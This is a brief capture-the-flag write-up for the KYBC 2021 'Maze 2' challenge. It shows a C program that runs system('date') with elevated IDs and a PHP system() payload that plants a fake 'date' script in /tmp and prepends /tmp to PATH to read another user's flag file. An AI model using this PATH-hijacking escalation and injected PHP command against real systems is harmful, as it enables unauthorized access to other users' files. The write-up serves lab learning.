Title: KYBC 2021 - Maze 2 Writeup
Date: 2021-03-22
Tags: ctf, lfi, rce, kybc
Slug: kybc-yogosha-2021-maze-2-writeup
Summary: Writeup for Maze 2 challenge at KYBC CTF


_In order to start this challenge it was necessary to complete [Maze 1]({filename}/ctf/kybc-yogosha-maze1.md) first_

After catching the first flag, let's check what's in `home/ctf_user2`. There is a flag file, but this time concatenating it doesn't work since the current user (`ctf_user1`) doesn't have read permissions to it. The only other interesting thing is a file called `sysadmin.c`. Permissions are in my favor this time, so let's have a look at the content:

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{

    printf("Hello sysadmin :) \n");
    printf("Today date : \n");
    fflush(stdout);
    setreuid(geteuid(), getuid());
    system("date");
    return 0;
}
```

That `system("date")` call looks promising, so let's try to replace it with some useful bash statement instead:

```
<?php system('echo "cat /home/ctf_user2/.52942ab6e8a6dd0bd75a9029c2b5c574_flag2.txt" > /tmp/date && chmod 777 /tmp/date && export PATH=/tmp:$PATH && /home/ctf_user2/sysadmin'); ?>
```

Check the proc file and catch the flag - success!
